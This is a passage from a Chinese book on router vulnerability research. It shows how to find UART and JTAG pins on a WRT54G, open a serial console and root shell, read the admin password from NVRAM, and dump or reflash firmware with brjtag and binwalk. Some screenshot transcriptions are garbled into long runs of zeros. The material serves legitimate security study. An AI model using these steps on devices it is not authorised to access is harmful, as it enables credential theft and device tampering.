将万用表量程放在直流电压 20 伏特档位上，给路由器上电（将路由器电源接通），从路由器启动到系统完全启动这段时间内观察到电压值基本稳定在 3.30 伏特，因此，1 号和 2 号引脚为 VCC 引脚的猜想得到了验证，如图 16-9 所示。

 </div>

##### (3) 测试 TXD 引脚

当串行端口处于激活状态并发送数据（否则无法测试出发送引脚）时，发送引脚是相当容易识别的。主板上的发送引脚被拉高到与 VCC 引脚相同的电压，通常是 3.3 伏特。在有数据发送时，电压将下降到 0。当读取的是一个不断变化的直流电压时，数字万用表将显示最终的平均采样电压。因此，如果万用表显示引脚电压下降，表示该引脚有数据发送，由此可以判断该引脚是 TXD 引脚。

在路由器中，引导程序、内核、系统的所有启动信息都将被打印到串口，因此，我们测试TXD引脚的最佳时机就在系统启动阶段。我们在路由器系统启动期间监控3号、4号、5号和6号这4个引脚，应该能够很容易地识别哪些是发送引脚。

测试 3 号和 4 号引脚，发现其电压在一段时间内保持在 3.30 伏特，如图 16-10 所示。

过了一会儿，电压突然降到 2.83 伏特，如图 16-11 所示。

 </div>

 </div>

接着，电压便恢复到 3.29 伏特。

继续测试，发现 5 号和 6 号引脚的特征与 TXD 引脚的特征不符，因此判断 3 号和 4 号引脚为 TXD 引脚。

虽然这是识别发送引脚的一种有效方法，但值得注意的是，如果串行端口只发送少量数据，通过电压波动判断可能就不是那么准确了，这时我们需要使用示波器或逻辑分析仪捕获发送引脚的数据活动。

##### (4) 测试RXD引脚

准确地识别接收引脚是最困难的，因为它没有十分有效的特征定义。通常我们通过测试找出 TXD 引脚，另一个引脚就是 RXD 引脚了。例如，在 WRT54G 路由器的主板上，5 号和 6 号引脚就是 RXD 引脚。

经过上面的测试，我们基本上完成了对 WRT54G 路由器主板的引脚测试，2 个串口（ttys0 和 ttys1）都已经找出来了。需要注意的是，并不是所有的路由器主板都有 2 个串口。

在 WRT54G v2 路由器的主板上有 2 个 URAT 接口，测试结果如表 16-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>引脚</td><td style='text-align: center; word-wrap: break-word;'>定义</td><td style='text-align: center; word-wrap: break-word;'>引脚</td><td style='text-align: center; word-wrap: break-word;'>定义</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>1</td><td style='text-align: center; word-wrap: break-word;'>VCC(3.3V)</td><td style='text-align: center; word-wrap: break-word;'>6</td><td style='text-align: center; word-wrap: break-word;'>RXD(ttyS0)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2</td><td style='text-align: center; word-wrap: break-word;'>VCC(3.3V)</td><td style='text-align: center; word-wrap: break-word;'>7</td><td style='text-align: center; word-wrap: break-word;'>NC</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3</td><td style='text-align: center; word-wrap: break-word;'>TXD(ttyS1)</td><td style='text-align: center; word-wrap: break-word;'>8</td><td style='text-align: center; word-wrap: break-word;'>NC</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>TXD(ttyS0)</td><td style='text-align: center; word-wrap: break-word;'>9</td><td style='text-align: center; word-wrap: break-word;'>GND</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>5</td><td style='text-align: center; word-wrap: break-word;'>RXD(ttyS1)</td><td style='text-align: center; word-wrap: break-word;'>10</td><td style='text-align: center; word-wrap: break-word;'>GND</td></tr></table>

#### 16.2.2 连接串口

在识别了串口的各个引脚之后，我们就可以通过一条 USB 转 UART 适配器的 TTL-232R-3V3 线连接进行连接了。将 UART 适配器的 USB 接口端插入计算机的 USB 接口，将 UART 适配器连接到路由器串行端口中，使用方式如下。

将适配器的 GND 连接到串口的 GND。

➢ 将适配器的 RXD 连接到串口的 TXD。

➢ 将适配器的 TXD 连接到串口的 RXD。

接下来，我们开始进行硬件连接的准备工作。

首先，用排针或者将 10 个引脚的牛角座焊接到主板上，如图 16-12 所示。

 </div>

然后，按照上面给出的方法使用条线连接 UART 适配器和串口（使用靠近主板边缘的  $ ttyS0 $ 串行接口），如图 16-13 所示。

 </div>

连接好 UART 适配器和路由器串口以后，将 .UART 适配器连接到计算机。由于本例是虚拟机环境，所以需要确认已经将 TTL-232R-3V3 适配器添加到虚拟机中，如图 16-14 所示。

 </div>

硬件方面的操作到这里基本上已经完成了，接下来，我们需要检查串行端口的协议设置。串行端口有多种设置，但是在这里我们只需要完成波特率的设置即可。尝试错误是识别波特率最快和最简单的方法。因为串行端口通常用于显示调试信息（即它们发送 ASCII 数据），并且只有少数可能频率的波特率，所以我们可以循环逐一测试可能的波特率，直到输出可理解的数据（如 ASCII 码）时，就找到了当前串口的波特率。

在本书提供的下载链接中，baudrate.py 有一个功能选项 “-a” 可以自动检测波特率，使用方法如下。

embedded@ubuntu:~/soft$ sudo python baudrate.py -a
Starting baudrate detection on /dev/ttyUSB0, turn on your serial device now.
Press Ctrl+C to quit.
@@@@Baudrate: 9600 @@@@@@
---snip---
@@@@Baudrate: 115200 @@@@@@
Detected baudrate: 115200
Save minicom configuration as:

这里我们检测到 WRT54G 路由器主板的串口使用的波特率为 115200，但需要注意的是，在自动检测的过程中，要保证串口有数据输出，否则 baudrate.py 将无法准确检测波特率。

#### 16.2.3 在Linux下读取路由器串口数据

在 Linux 环境下读取路由器串口数据有以下几种方法。

# 1. 通过miniterm.py连接路由器串口

在知道路由器串口的波特率之后，我们可以直接运行本书下载链接中的 miniterm.py。例如，知道波特率为 115200，运行如下命令。

embedded@ubuntu:~/soft$ sudo miniterm.py /dev/ttyUSB0 115200
--- Miniterm on /dev/ttyUSB0: 115200,8,N,1 ---
--- Quit: Ctrl+] | Menu: Ctrl+T | Help: Ctrl+T followed by Ctrl+H ---

此时，miniterm.py 处于等待状态。启动路由器（接通电源），可以看到在 Ubuntu 终端已经打印了启动信息，具体如下。

CFE version 1.0.37 for BCM947XX (32bit, SP, LE)
Build Date: Fri Feb 27 15:20:59 CST 2004 (root@honor)
Copyright (C) 2000, 2001, 2002, 2003 Broadcom Corporation.
Initializing Arena.
Initializing Devices.
et0: Broadcom BCM47xx 10/100 Mbps Ethernet Controller 3.50.21.0
CPU type 0x29007: 200MHz
Total memory: 0x2000000 bytes (32MB)
Total memory used by CFE: 0x80334DC0 - 0x8043A310 (1070416)
Initialized Data: 0x80334DC0 - 0x80336F40 (8576)
BSS Area: 0x80336F40 - 0x80338310 (5072)
Local Heap: 0x80338310 - 0x80438310 (1048576)
Stack Area: 0x80438310 - 0x8043A310 (8192)
Text (code) segment: 0x80300000 - 0x8030F220 (61984)
Boot area (physical): 0x0043B000 - 0x0047B000
----snip----

# 2. 路由器CFE命令模式

在 WRT54G 路由器的启动阶段，按 “Ctrl+C” 组合键可以中止 WRT54G 路由器系统的启动过程，进入 CFE 命令行模式，示例如下。

CFE version 1.0.37 for BCM947XX (32bit, SP, LE)
Build Date: Fri Feb 27 15:20:59 CST 2004 (root@honor)
Copyright (C) 2000, 2001, 2002, 2003 Broadcom Corporation.
Initializing Arena.
Initializing Devices.
----snip----
Boot version: v2.3
The boot is CFE

mac_init(): Find mac [00:0F:66:AE:B4:DC] in location 1
Nothing...
Device eth0: hwaddr. 00-0F-66-AE-B4-DC, ipaddr 192.168.1.1, mask
255.255.255.0
gateway not set, nameserver not set
Reading :: Failed.: Error
CFE>

输入 “help” 可以查看当前支持的命令，具体如下。

CFE> help
Available commands:

et Broadcom Ethernet utility.
nvram NVRAM utility.
reboot Reboot.
flash Update a flash memory device
memtest Test memory.
f Fill contents of memory.
e Modify contents of memory.
d Dump memory.
u Disassemble instructions.
autoboot Automatic system bootstrap.
batch Load a batch file into memory and execute it
go Verify and boot OS image.
boot Load an executable file into memory and execute it
load Load an executable file into memory without executing
it
save Save a region of memory to a remote file via TFTP
ping Ping a remote IP host.
arp Display or modify the ARP Table
ifconfig Configure the Ethernet interface
show devices Display information about the installed devices.
unsetenv Delete an environment variable.
printenv Display the environment variables
setenv Set an environment variable.
help Obtain help for CFE commands
For more information about a command, enter 'help command-name'
*** command status = 0

使用这些命令可以完成路由器 CFE、FLASH、NVRAM 的相关操作。这里我们以查看 WRT54G 路由器 NVRAM 配置信息中关于登录页面密码的内容为例，命令如下。

CFE> nvram get http_passwd

admin
*** command status = 0

从返回的结果可以知道，这台 WRT54G 路由器的 Web 管理功能的登录密码是 “admin”。

# 3. 路由器Linux系统模式

在 WRT54G 路由器的启动过程中，如果不使用 “Ctrl+C” 组合键，路由器就会正常启动，启动信息打印如下。

CFE version 1.0.37 for BCM947XX (32bit, SP, LE)
Build Date: Fri Feb 27 15:20:59 CST 2004 (root@honor)
Copyright (C) 2000, 2001, 2002, 2003 Broadcom Corporation.
Initializing Arena.
Initializing Devices.
----snip---
gateway not set, nameserver not set
pppoe0 ifname=ppp0 ip=10.64.64.64, netmask=255.255.255.255,
gw=10.112.112.112

No interface specified. Quitting...
Hit enter to continue...

等待系统启动完成，提示按 “Enter” 键继续。按下 “Enter” 键，就可以进入 Linux 系统，提示如下。

BusyBox v0.60.0 (2005.07.12-09:08+0000) Built-in shell (msh)
Enter 'help' for a list of built-in commands.
#

此时，我们就可以使用命令管理路由器了。例如，查看运行在路由器上的 Web 服务器的动态库链接地址，命令如下。

ps | grep httpd

63 0    S    httpd

147 0    S    grep httpd

# cat /proc/63/maps/grep_libc.so.0

2aac0000-2aac7000 r-xp 00000000 1f:02 1530 /lib/ld-uClibc.so.0
2ab06000-2ab07000 rw-p 00006000 1f:02 1530 /lib/ld-uClibc.so.0
2ad53000-2ad88000 r-xp 00000000 1f:02 1560 /lib/libc.so.0
2adc7000-2adc9000 rw-p 00034000 1f:02 1560 /lib/libc.so.0

可以看到， $ libc.so.0 $ 的加载基址为 0x2ad53000。

#### 16.2.4 在Windows下读取路由器串口数据

在 Windows 环境下同样可以连接路由器的串行端口，接下来我们就来看看如何使用 Putty 连接路由器的串行端口。

连接好适配器与串口以后，首先通过 Windows 的设备管理器查找适配器端口 COM3，然后配置 Putty，设置 “Connect type” 为 “Serial”，将 “Serial line” 修改为 “COM3”，设置波特率为 115200。配置好以上基本信息以后，单击 “Open” 按钮进行连接，启动路由器，如图 16-15 所示。如果要进入 CFE 命令行模式，只要在启动过程中按 “Ctrl+C” 组合键即可。

 </div>

通过路由器的串行端口可以获得启动信息。在 CFE 模式下可以利用 CFE 执行命令、操作 NVRAM 等。在对 FLASH 进行操作可以通过 CFE 更新固件。通过串行端口还可以获得 Shell 管理系统。

## 16.3 JTAG提取数据

为了解决提取 FLASH 数据的问题，下面我们将演示从 JTAG 中提取 FLASH 数据的方法。

#### 16.3.1 JTAG连接

“JTAG” 是 “Joint Test Action Group” 的缩写。JTAG 组织成立于 1985 年，是由几家主要的电子制造商发起和制定的 PCB 和 IC 测试标准。

JTAG 主要应用于电路的边界扫描测试和可编程芯片的在线系统编程。JTAG 也是一种国际标准测试协议，主要用于芯片的内部测试。现今多数的高级器件都支持 JTAG 协议。标准的 JTAG 接口是 4 线，TMS、TCK、TDI、TDO 分别为模式选择、时钟、数据输入、数据输出。JTAG 引脚的相关定义如下。

TCK 为测试时钟输入。

➢ TDI 为测试数据输入，数据通过 TDI 引脚输入 JTAG 接口。

TDO 为测试数据输出，数据通过 TDO 引脚从 JTAG 接口输出。

TMS 为测试模式选择，用于设置 JTAG 接口处于某种特定的测试模式。

TRST 为测试复位，输入引脚、低电平有效。该引脚非必须，是可选项。

GND 为接地。

TRST 引脚是一个可选的、相对待测逻辑低电平有效的复位开关。根据芯片的不同，它通常是异步的，但有时也可能是同步的。如果该引脚没有定义，则待测逻辑可由同步时钟输入复位指令复位，因此，在通常情况下我们只需要连接 TDI、TDO、TCK、TMS、GND 这 5 根线就够了。

一个含有 JTAG Debug 接口模块的 CPU，只要时钟正常，就可以通过 JTAG 接口访问 CPU 的内部寄存器和挂在 CPU 总线上的设备，如 FLASH、RAM、SOC（System on Chip）内置模块的寄存器。

确定 JTAG 接口所具备的能力以后，要想使用这些功能，还需要软件的配合，所实现的功能则由具体的软件决定。下面以 WRT54G 路由器主板数据的提取为例，选择支持 WRT54G 路由器的 brjtag.exe 进行数据提取。

首先找到 WRT54G v2 路由器主板上的 JTAG 接口。在 WRT54G v2 路由器主板的 JTAG 接口旁边已经标明了各引脚的编号，焊接方式如图 16-16 所示。

##### 揭秘家用路由器 0day 漏洞挖掘技术

 </div>

 </div>

 </div>

要想连接 WRT54G 路由器主板的 JTAG 接口，还需要一根并口的 JTAG 连接线。JTAG 连接线可以在计算机配件经销商处买到，在购买时需要问清楚这根线的接口是如何定义的。当然，如果动手能力比较强的话，也可以自己制作 JTAG 连接线。

笔者使用的并口 JTAG 连接线如图 16-18 所示。此连接线一共由 4 个部分组成，分别是并口插头 1 个、10P 排线 1 根、10 针压线牛角（如图 16-19 所示）1 个、100 欧姆电阻 4 个。

 </div>

 </div>

计算机的并口一共有 25 个引脚，部分引脚的含义如表 16-2 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>引脚</td><td style='text-align: center; word-wrap: break-word;'>含义</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2</td><td style='text-align: center; word-wrap: break-word;'>TDI</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3</td><td style='text-align: center; word-wrap: break-word;'>TCK</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>TMS</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>13</td><td style='text-align: center; word-wrap: break-word;'>TDO</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>20-25</td><td style='text-align: center; word-wrap: break-word;'>GND</td></tr></table>

并口与压线牛角的接线方法如图 16-20 所示。

 </div>

可以看到，左边是计算机的并口，右边是一个 10 针的压线牛角，中间用波浪形标注的 R1～R4 是 4 个电阻。最终的 JTAG 连接线如图 16-21 所示。

 </div>

获得了合适的 JTAG 连接线之后，将其并口连接到计算机，主板与 JTAG 连接线压线牛角连线的对应关系如图 16-22 所示。

 </div>

按照图 16-22 使用杜邦线连接路由器的主板 JTAG 接口和 JTAG 连接线压线牛角的一端。杜邦线如图 16-23 所示。

 </div>

 </div>

 </div>

#### 16.3.2 brijtag的使用

WRT54G v2 路由器的 CPU 是 Broadcom。有一款用于 Broadcom CPU 路由器 JTAG 连接线的 FLASH 刷写工具叫做 brjtag，可以访问 http://115.com/file/c2wnrk2u#brjtag-2.05.rar 下载。下载后解压缩，重启计算机，然后进入 BIOS 确认并口的模式，其工作状态设置为 “ECP”，中断设置为 “378”，保存后重启（这一步可以省略，因为一般计算机的 BIOS 默认就是以上的工作状态）。

01 把 JTAG 文件夹复制到系统中，本例复制到桌面。

02 依次选择 “开始” → “运行” 选项，输入 “%systemroot%\\system32\\drivers\\”，按 “回车” 键，系统会打开一个文件夹，将 JTAG 目录里的 giveio.sys 复制进去。

03 运行目录中的 loaddrv.exe，在路径中填写 “c:\windows\system32\drivers\giveio.sys”（Windows Vista/7 使用管理员权限）。

04 单击 “Install” 按钮，如图 16-25 所示。

 </div>

05 双击 “Start” 按钮，单击 “OK” 按钮，窗口将自动关闭，这时 JTAG 连接线的驱动程序已安装完成。

06 在 JTAG 文件夹中创建批处理文件 start.bat，内容为 “cmd.exe”，如图 16-26 所示。创建好以后，双击 start.bat 文件，就可以执行 JTAG 文件夹下的程序了。

 </div>

07 检查硬件的连接和软件是否可用。使用 “brjtag.exe -probeonly” 命令，“CPU Chip ID” 为全 0 或全 F 都表示 JTAG 线与主板的连接有问题。如图 16-27 所示，表示成功连接。

##### 揭秘家用路由器 0day 漏洞挖掘技术

 </div>

这里需要注意的是，通过 JTAG 端口获取的如图 16-27 所示方框内的信息是非常有用的，如果需要对 WRT54G v2 路由器的主板进行 JTAG 调试，可能会用到这些关键信息。在了解了 brijtag 的安装和基本使用方法以后，我们就可以使用 brijtag 提取路由器中的数据了。

#### 16.3.3 提取FLASH

FLASH 芯片中存储了路由器的固件，其中包含路由器的 bootloader 信息。因为每个路由器厂商在对操作系统进行编码和压缩的时候可能会使用一些非标准的算法，因此，有些时候，提取和分析 bootloader 也是很有必要的。在无法通过网络下载路由器固件的时候，我们可以通过 JTAG 方式读取路由器 FLASH 中的固件，对文件系统及 bootloader 进行提取和分析。

使用 brijtag 对路由器 FLASH 进行操作的基本命令如下。

➢ brjtag-backup:kernel: 备份固件。

➢ brijtag -erase:kernel: 擦除固件。

brjtag -flash:kernel: 写入固件。

➢ brijtag -backup:wholeflash: 备份 wholeflash（包含 CFE/NVRAM/KERNEL）。

brjtag -erase:wholeflash: 擦除 wholeflash（包含 CFE/NVRAM/KERNEL）。

brjtag -flash:wholeflash: 写入 wholeflash（包含 CFE/NVRAM/KERNEL）。

接下来，我们以备份的方式提取 FLASH 中的数据，如图 16-28 所示。

 </div>

用 Binwalk 对从 FLASH 中导出的数据 KERNEL.BIN.SAVED_20150114_144843 进行分析，结果如下。

embedded@ubuntu:~/soft$ binwalk KERNEL.BIN.SAVED_20150114_144843

DECIMAL HEXADECIMAL DESCRIPTION
0 0x0 TRX firmware header, little endian, header size: 28 bytes, image size: 2875392 bytes, CRC32: 0x96BD6617 flags: 0x0, version: 1
28 0x1C gzip compressed data, maximum compression, has original file name: "piggy", from Unix, last modified: Fri Sep 16 16:47:53
2005
686832 0xA7AF0 Squashfs filesystem, little endian, version

揭秘家用路由器 0day 漏洞挖掘技术

2.0, size: 2183981 bytes, 312 inodes, blocksize: 65536 bytes, created: Fri
Sep 16 16:49:36 2005
2884195 0x2C0263 Zlib compressed data, default compression, uncompressed size >= 772
---snip---
2950840 0x2D06B8 Zlib compressed data, default compression, uncompressed size >= 2056

通过上面的信息可以知道，WRT54G 路由器主板的 Firmware 文件采用 TRX 文件格式。Binwalk 动态解析 TRX Header 定义如下。

struct trx_header {
    uint32_t magic; /* "HDR0" */
    uint32_t len; /* Length of file including header */
    uint32_t crc32; /* 32-bit CRC from flag_version to end of file */
    uint32_t flag_version; /* 0:15 flags, 16:31 version */
    uint32_t offsets[3]; /* Offsets of partitions from start of header */
};

根据这个 TRX 头部定义，我们可以得出如下结论。

magic:HDR0
length:2875392 (0x2be000)
crc32:2528994839 (0x96bd6617)
flag_version:65536 (0x10000)

trx header offset:0 (0x0)
kernel LZMA offset:28 (0x1c)
filesystem offset:686832 (0xa7af0)

从 Binwalk 中我们可以知道，偏移起始位置 0x1C 是一段压缩数据，这是因为内核是使用 LZMA 算法压缩的，在 bootloader 中会对其进行解压缩。因此，本例中 WRT54G 路由器固件的组成如图 16-29 所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>trx header</td><td style='text-align: center; word-wrap: break-word;'>Izma&#x27;d kernel</td><td style='text-align: center; word-wrap: break-word;'>(SquashFS filesystem)</td></tr></table>

 </div>

通过串口进入 CFE 命令行模式，运行命令 “show devices”，得到如图 16-30 所示的信息。在 flash0 中包含 4 个分区，分别为 boot 分区、trx 分区、os 分区、nvram 分区。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="2">CRE&gt; Snow devices</td></tr></table>

 </div>

整个 FLASH 的结构如图 16-31 所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>CFE</td><td style='text-align: center; word-wrap: break-word;'>trx</td><td style='text-align: center; word-wrap: break-word;'>lzma&#x27;d kernel</td><td style='text-align: center; word-wrap: break-word;'>SquashFS</td><td style='text-align: center; word-wrap: break-word;'>NVRAM</td></tr></table>

 </div>

因此，我们在更新固件时，并未对 FLASH 中的 CFE 和 NVRAM 产生影响。

使用 Binwalk 对 KERNEL.BIN.SAVED_20150114_144843 进行分析以后，提取的 squashfs 文件系统如图 16-32 所示。

 </div>

#### 16.3.4 提取CFE

➢ 使用 brjtag 读取路由器 NVRAM 的基本命令如下。

brjtag -backup:cfe: 备份 CFE。

♀ brjtag -erase:cfe: 擦除 CFE。

➢ brjtag -flash:cfe: 写入 CFE。

接下来，我们以备份的方式提取 CFE 中的数据，如图 16-33 所示。

C:\Windows\system32\cmd.exe

Windows Hardware Desktop Unit 1

Broadband ETLING Dehastek U.S.C.C. v4.0.0 Ingebird

Building Data ... Data

User-defined Length set Go U

EU Computing under Institute citizen

CRD Chip ID: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

 </div>

#### 16.3.5 提取NVRAM

路由器的配置文件都存放在 NVRAM 中，因此，通过读取 NVRAM 可以得到路由器的所有配置信息。使用 brjtag 读取路由器 NVRAM 的基本命令如下。

➢ brjtag -backup:nvram: 备份 NVRAM。

➢ brijtag-erase:nvram: 擦除 NVRAM。

➢ brjtag -flash:nvram: 写入 NVRAM。

接下来，我们以备份的方式提取 NVRAM 中的数据，如图 16-34 所示。

当数据备份完成以后，可以在 brijtag 的运行目录下找到以 “NVRAM” 开头的文件，如 NVRAM.BIN.SAVED_20150114_144406。使用文本编辑器打开提取的文件 NVRAM.BIN.SAVED_20150114_144406，如图 16-35 所示，其中包含很多关于该路由器的配置信息。例如，搜索 WRT54G 路由器登录密码关键字 “http_pass”，可以找到 “http_pass=admin” 的描述，所以，路由器的登录密码为 “admin”，与在 CFE 命令行模式下得到的 NVRAM 信息是一致的。

C:\Windows\system32\cmd.exe - bjtag -backup:nvram

C:\Users\Nantware\Desktop\TTAG\bjtag -backup:nvram

Broadcom EUTAG Debrick Utility v1.8h-hugebird

Probing bus ... Done

Instruction Length set to 8

CPU running under LITTLE endian

CPU Chip IDs: 0001G100011100010010000101111111 (1471217F)

Found a Broadcom BCH4712 Rev 1 CPU chip

= EUTAG IMPCODE 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

 </div>

-

 </div>

### 第 5 篇 路由器漏洞挖掘

### 第 17 章 路由器漏洞挖掘技术

漏洞研究主要分为漏洞分析与漏洞挖掘两部分。漏洞分析技术是指对已发现漏洞的细节进行深入分析，为漏洞利用、补救等处理措施作铺垫。漏洞挖掘技术是指对未知漏洞的探索，综合应用各种技术和工具，尽可能找出软件中的潜在漏洞。前面已经通过实例对漏洞分析方法进行了详尽的阐述，本章将介绍漏洞研究更高层次的技术——漏洞挖掘，通过几种流行的漏洞挖掘方法和几个实例实践漏洞挖掘理论。

本章实验测试环境说明如表 17-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>测试环境</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>操作系统</td><td style='text-align: center; word-wrap: break-word;'>Debian MIPS</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SPIKE</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>使用已安装SPIKE的Kali Linux</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>调试器</td><td style='text-align: center; word-wrap: break-word;'>IDA 6.1</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

## 17.1 漏洞挖掘技术简介

漏洞（Vulnerability）是指系统中存在的一些功能性或安全性的逻辑缺陷，包括一切威胁、损坏计算机系统安全性的因素，是计算机系统在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷和不足。

从技术角度讲，漏洞的存在不可避免。一般来说，软件或者系统结构越复杂，发现漏洞的难度越高，但与此同时，发现漏洞的可能性却越大。一旦某些较严重的漏洞被攻击者发现，就有可能被其利用，导致计算机被非法远程控制，用户隐私信息被泄露，甚至威胁普通大众的财产及人身安全。正因安全漏洞影响如此之大，先于攻击者发现并及时修补漏洞、有效减少来自网络的威胁就成为安全从业者毕生的追求。因此，主动发掘并分析安全漏洞具有重要的意义。

目前广泛应用的漏洞挖掘技术可以分为如下两类。

➢ 静态代码审计：代码审计技术根据分析对象的不同，可以分为源码审计和基于目标代码的漏洞挖掘。代码审计其实是一种白盒测试技术，在测试时能够了解被测对象的结

构，查阅被测代码内容的测试工作。这种白盒测试直接的好处就是知道所设计的测试用例在代码层次的哪些地方被忽略，它的优点是帮助软件测试人员增大代码的覆盖率，提高代码的质量，发现代码中隐藏的问题。这种方法需要审核者了解编程概念和产品功能的每一个细节，深入地了解产品运行环境。但是，基于代码审计有一个致命的缺陷，就是必须获得源码。而基于目标代码的审计其实也可以算作一种白盒测试，我们可以通过反汇编或者反编译的方式间接获得其源码。

